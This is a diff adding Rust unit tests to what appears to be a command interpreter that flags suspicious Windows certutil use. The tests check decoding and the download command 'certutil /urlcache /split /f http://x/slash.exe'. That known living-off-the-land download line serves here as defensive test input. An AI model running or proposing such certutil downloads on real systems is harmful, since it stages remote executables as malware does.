@@ -6510,6 +6510,40 @@ mod certutil_tests {
     }
 
     #[test]
+    fn certutil_decode_accepts_slash_prefixed_flags() {
+        let mut env = Environment::new(&Config::default());
+        let payload = "hello slash";
+        env.modified_filesystem.insert(
+            "src.b64".to_string(),
+            FsEntry::Content {
+                content: b64(payload).into_bytes(),
+                append: false,
+            },
+        );
+
+        interpret_line("certutil /decode /f src.b64 dst.bin", &mut env);
+
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::CertutilDecode { src, dst, src_resolved } if src == "src.b64" && dst == "dst.bin" && *src_resolved
+            )
+        });
+        assert!(
+            has,
+            "no resolved CertutilDecode for slash-prefixed flags: {:?}",
+            env.traits
+        );
+        if let Some(FsEntry::Decoded { content, .. }) = env.modified_filesystem.get("dst.bin") {
+            assert_eq!(&content[..], payload.as_bytes());
+        } else {
+            panic!(
+                "dst.bin not Decoded for slash-prefixed flags: {:?}",
+                env.modified_filesystem.get("dst.bin")
+            );
+        }
+    }
+
+    #[test]
     fn certutil_urlcache_emits_download_trait() {
         let mut env = Environment::new(&Config::default());
         interpret_line(
@@ -6596,6 +6630,26 @@ mod certutil_tests {
             env.traits
         );
         assert!(env.modified_filesystem.contains_key("out.exe"));
+    }
+
+    #[test]
+    fn certutil_urlcache_accepts_slash_prefixed_flags() {
+        let mut env = Environment::new(&Config::default());
+        interpret_line(
+            r#"certutil /urlcache /split /f http://x/slash.exe slash.exe"#,
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::CertutilDownload { url, dst } if url == "http://x/slash.exe" && dst == "slash.exe"
+            )
+        });
+        assert!(
+            has,
+            "no CertutilDownload trait for slash-prefixed flags: {:?}",
+            env.traits
+        );
+        assert!(env.modified_filesystem.contains_key("slash.exe"));
     }
 
     #[test]
